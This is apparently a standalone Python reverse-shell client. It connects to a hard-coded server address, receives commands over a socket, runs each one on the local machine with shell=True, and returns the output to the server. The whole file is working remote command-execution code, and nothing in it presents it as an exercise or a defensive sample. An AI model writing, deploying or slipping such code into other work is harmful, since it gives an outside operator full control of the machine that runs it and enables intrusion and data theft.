import socket
import os
import threading
import subprocess
from rich.console import Console

CONSOLE = Console()

# Message info
HEADER = int(os.environ.get("MESSAGE_HEADER", 64))
FORMAT = os.environ.get("MESSAGE_FORMAT", "utf-8")
DISCONNECT_MSG = os.environ.get("DISCONNECT_MSG", "!DISCONNECT")

# Server info
SERVER = "192.168.1.151" #! Change the server IP !#
PORT = os.environ.get("SERVER_PORT", 5050) #* Change the port *#
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def send(msg:str):
    message = msg.encode(FORMAT)

    msg_lenght = len(message)
    send_lenght = str(msg_lenght).encode(FORMAT)
    # Pad the send lenght
    send_lenght += b" " * (HEADER-len(send_lenght))

    client.send(send_lenght)
    client.send(message)

def recv(stopEvent:threading.Event):
    while True:
        if stopEvent.is_set():
            break
        
        msg_lenght = client.recv(HEADER).decode(FORMAT)
        if not msg_lenght:
            continue
        msg_lenght = int(msg_lenght)

        msg = client.recv(msg_lenght).decode(FORMAT)
        
        if not msg:
            send("")
            continue

        CONSOLE.print("[red][SERVER][white] ", end="")
        CONSOLE.print(f"{msg}", markup=False)
        output = run_command(msg)
        CONSOLE.print("[yellow]", end="")
        CONSOLE.print(f"{output}", markup=False)
        send(output)


def run_command(command):
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
        return output.decode(encoding="ISO-8859-1")
    except subprocess.CalledProcessError as e:
        return e.output.decode(encoding="ISO-8859-1")

stopEvent = threading.Event()
recvThread = threading.Thread(target=recv, args=(stopEvent,))
recvThread.start()

CONSOLE.input("[white]...", password=False)
send(DISCONNECT_MSG)
stopEvent.set()